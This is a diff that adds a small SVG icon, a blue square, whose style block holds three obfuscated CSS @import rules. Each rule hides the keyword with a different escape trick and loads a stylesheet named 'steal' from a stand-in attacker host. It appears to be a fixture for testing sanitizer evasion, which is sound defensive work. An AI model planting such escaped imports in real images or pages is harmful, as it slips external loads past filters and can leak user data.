@@ -1,0 +1,9 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64">
+  <style>
+    @\69 mport url(https://attacker.invalid/steal.css);
+    @\49\4d\50\4f\52\54 "https://attacker.invalid/steal2.css";
+    @\i\m\p\o\r\t "https://attacker.invalid/steal3.css";
+    .a { fill: #2849ff; }
+  </style>
+  <rect class="a" width="64" height="64"/>
+</svg>
